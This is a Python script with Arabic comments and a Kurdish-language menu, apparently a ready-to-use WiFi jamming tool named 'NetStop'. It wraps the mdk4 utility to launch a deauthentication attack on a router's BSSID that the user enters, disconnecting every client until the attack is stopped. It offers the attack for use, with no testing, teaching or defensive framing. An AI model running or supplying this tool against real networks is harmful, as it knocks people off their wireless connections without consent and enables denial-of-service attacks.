#!/usr/bin/env python3
import subprocess
import os
import sys
import time

# ألوان لتزيين واجهة الـ Terminal
RED = "\033[1;31m"
CYAN = "\033[1;36m"
GREEN = "\033[1;32m"
YELLOW = "\033[1;33m"
RESET = "\033[0m"

def clear_screen():
    os.system('clear')

def show_banner():
    clear_screen()
    print(f"{CYAN}==============================================={RESET}")
    print(f"{RED}          NetStop Tool (MDK4 Edition)          {RESET}")
    print(f"{CYAN}==============================================={RESET}")
    print(f"{YELLOW}  ئامرازی کۆنتڕۆڵ و بڕینی گشتی تۆڕ لە ڕێگەی هەواوە{RESET}")
    print(f"{CYAN}==============================================={RESET}\n")

def start_attack(interface, bssid):
    show_banner()
    print(f"{RED}[+] هێرشی بڕینی هێڵ (MDK4) چالاک کرا لەسەر ڕاوتەری: {bssid}{RESET}")
    print(f"{YELLOW}[*] بۆ ڕاگرتنی هێرشەکە و گەڕانەوەی ئینتەرنێت، کلیک لەسەر (Ctrl + C) بکە...{RESET}\n")
    
    # أمر mdk4 للفصل عبر الهواء
    command = ["sudo", "mdk4", interface, "d", "-a", bssid]
    
    try:
        # تشغيل الأمر مباشرة وعرض مخرجاته في الـ Terminal ليرى المستخدم الهجوم وهو يعمل
        subprocess.run(command)
    except KeyboardInterrupt:
        print(f"\n\n{GREEN}[+] هێرشەکە ڕاگیرا و هێڵ بۆ تەواوی ئامێرەکان گەڕایەوە بنەچەی خۆی. ✅{RESET}")
        time.sleep(3)

def main():
    # التأكد من تشغيل الأداة بصلاحيات الروت
    if os.geteuid() != 0:
        print(f"{RED}[-] تکایە ئامرازەکە وەک بەرپرسیار (sudo) ڕاکەرەوە!{RESET}")
        sys.exit(1)

    while True:
        show_banner()
        print(f"{CYAN}[1]{RESET} ده‌ستپێکردنی هێرشی بڕینی هێڵ لەسەر هەمووان 🚫")
        print(f"{CYAN}[2]{RESET} چوونەدەرەوە لە ئامرازەکە ❌\n")
        
        choice = input(f"{YELLOW}ژمارەیەک هەڵبژێره‌ (1 یان 2): {RESET}").strip()
        
        if choice == '1':
            show_banner()
            interface = input(f"{CYAN}[*] ناوی کارتی وایەرلێس (بۆ نموونە wlan0mon): {RESET}").strip()
            bssid = input(f"{CYAN}[*] ماک ئەدرەسی ڕاوتەر (BSSID): {RESET}").strip()
            
            if not interface or not bssid:
                print(f"{RED}[-] تکایە زانیارییەکان بە دروستی پڕبکەرەوە!{RESET}")
                time.sleep(2)
                continue
                
            start_attack(interface, bssid)
            
        elif choice == '2':
            print(f"\n{GREEN}سوپاس بۆ بەکارهێنانی ئامرازەکە! خوا حافیز 👋{RESET}")
            break
        else:
            print(f"{RED}[-] هەڵبژاردنی نادروست!{RESET}")
            time.sleep(1.5)

if __name__ == '__main__':
    main()